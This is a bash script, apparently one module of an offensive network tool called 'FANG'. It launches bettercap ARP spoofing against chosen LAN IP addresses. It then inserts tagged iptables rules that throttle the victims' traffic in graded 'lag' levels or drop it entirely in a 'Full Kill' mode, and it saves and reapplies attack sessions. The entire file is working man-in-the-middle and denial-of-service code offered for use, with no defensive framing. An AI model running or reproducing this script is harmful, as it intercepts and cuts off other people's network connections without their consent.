#!/bin/bash
# FANG attack — session lifecycle + tagged rules

ATTACK="None"
LAST_ATTACK=""
ATTACK_START=""
SESSION_ACTIVE=0

stop_bettercap() {
    pkill -f "bettercap" 2>/dev/null
    sleep 0.5
}

bettercap_alive() {
    pgrep -f "bettercap" &>/dev/null
}

# Remove only FANG-tagged rules
clear_fang_rules() {
    local line nums
    # Delete by comment tag (repeat until none left)
    while true; do
        nums=$(iptables -L FORWARD -n --line-numbers 2>/dev/null | grep "$COMMENT_TAG" | awk '{print $1}' | sort -rn)
        [[ -z $nums ]] && break
        for n in $nums; do
            iptables -D FORWARD "$n" 2>/dev/null
        done
    done
    tc qdisc del dev "${IFACE:-eth0}" root 2>/dev/null
}

start_spoof() {
    local t=$1
    [[ -z $t ]] && return 1
    # Validate every IP
    for ip in ${t//,/ }; do
        valid_ip "$ip" || { err "Invalid IP in targets: $ip"; return 1; }
    done

    info "Starting ARP spoof → $t"
    stop_bettercap
    bettercap -iface "$IFACE" -eval \
        "set arp.spoof.targets $t; set arp.spoof.fullduplex true; set arp.spoof.internal true; arp.spoof on" \
        >/dev/null 2>&1 &
    sleep 2

    if bettercap_alive; then
        ok "Spoof process running"
        return 0
    else
        err "bettercap failed to start"
        return 1
    fi
}

# Tagged lag rules (only FANG rules)
apply_lag() {
    local ip=$1 pps=$2
    valid_ip "$ip" || return 1
    iptables -I FORWARD -s "$ip" -m limit --limit "${pps}/s" --limit-burst $((pps+8)) \
        -m comment --comment "$COMMENT_TAG" -j ACCEPT
    iptables -I FORWARD -s "$ip" -m comment --comment "$COMMENT_TAG" -j DROP
    iptables -I FORWARD -d "$ip" -m limit --limit "${pps}/s" --limit-burst $((pps+8)) \
        -m comment --comment "$COMMENT_TAG" -j ACCEPT
    iptables -I FORWARD -d "$ip" -m comment --comment "$COMMENT_TAG" -j DROP
}

apply_drop() {
    local ip=$1
    valid_ip "$ip" || return 1
    iptables -I FORWARD -s "$ip" -m comment --comment "$COMMENT_TAG" -j DROP
    iptables -I FORWARD -d "$ip" -m comment --comment "$COMMENT_TAG" -j DROP
}

save_session() {
    cat > "$SESSION_FILE" << EOF
SESSION_ACTIVE=$SESSION_ACTIVE
ATTACK=$ATTACK
LAST_ATTACK=$LAST_ATTACK
ATTACK_START=$ATTACK_START
TARGET=$TARGET
TARGETS=${TARGETS[*]}
IFACE=$IFACE
EOF
}

load_session() {
    [[ -f $SESSION_FILE ]] && source "$SESSION_FILE" 2>/dev/null
}

# Unified stop — always safe
stop_session() {
    info "Stopping attack session..."
    stop_bettercap
    clear_fang_rules
    SESSION_ACTIVE=0
    ATTACK="None"
    ATTACK_START=""
    save_session
    log "Session stopped"
    ok "Session clean (spoof + FANG rules cleared)"
}

# Verify basics before attack
preflight() {
    local t=$1
    [[ -z $t ]] && { err "No targets"; return 1; }
    [[ $(cat /proc/sys/net/ipv4/ip_forward) == 1 ]] || {
        echo 1 > /proc/sys/net/ipv4/ip_forward
    }
    return 0
}

start_lag_session() {
    need_target || return
    local T pps name
    T=$(get_targets)
    preflight "$T" || return

    echo -e "\n  1) Light  2) Medium  3) Heavy  4) Extreme"
    read -p "  Level: " l
    case $l in
        1) pps=30; name="Light Lag";;
        2) pps=12; name="Medium Lag";;
        3) pps=5;  name="Heavy Lag";;
        4) pps=2;  name="Extreme Lag";;
        *) pps=12; name="Medium Lag";;
    esac

    stop_session 2>/dev/null
    start_spoof "$T" || return

    for ip in ${T//,/ }; do apply_lag "$ip" "$pps"; done

    SESSION_ACTIVE=1
    ATTACK=$name
    LAST_ATTACK="lag:$pps"
    ATTACK_START=$(date +%s)
    save_session
    log "$name → $T"
    ok "$name active"
    info "Stop with Restore / stop_session"
    pause
}

start_kill_session() {
    need_target || return
    local T
    T=$(get_targets)
    preflight "$T" || return
    ask "FULL KILL $T?" || return

    stop_session 2>/dev/null
    start_spoof "$T" || return

    for ip in ${T//,/ }; do apply_drop "$ip"; done

    SESSION_ACTIVE=1
    ATTACK="Full Kill"
    LAST_ATTACK="kill"
    ATTACK_START=$(date +%s)
    save_session
    log "KILL → $T"
    echo -e "\n  ${R}✔  Full Kill active${N}"
    pause
}

reapply_session() {
    need_target || return
    [[ -z $LAST_ATTACK ]] && { err "No previous attack"; return; }
    local T
    T=$(get_targets)
    preflight "$T" || return
    stop_session 2>/dev/null
    start_spoof "$T" || return

    if [[ $LAST_ATTACK == kill ]]; then
        for ip in ${T//,/ }; do apply_drop "$ip"; done
        ATTACK="Full Kill"
    else
        local pps=${LAST_ATTACK#lag:}
        for ip in ${T//,/ }; do apply_lag "$ip" "$pps"; done
        ATTACK="Re-applied Lag"
    fi
    SESSION_ACTIVE=1
    ATTACK_START=$(date +%s)
    save_session
    ok "Re-applied"
    pause
}

session_status() {
    echo -e "\n  ${Y}Session status${N}"
    echo "  Active     : $SESSION_ACTIVE"
    echo "  Attack     : $ATTACK"
    echo "  bettercap  : $(bettercap_alive && echo running || echo stopped)"
    echo "  FANG rules :"
    iptables -L FORWARD -n -v 2>/dev/null | grep "$COMMENT_TAG" || echo "    (none)"
    pause
}
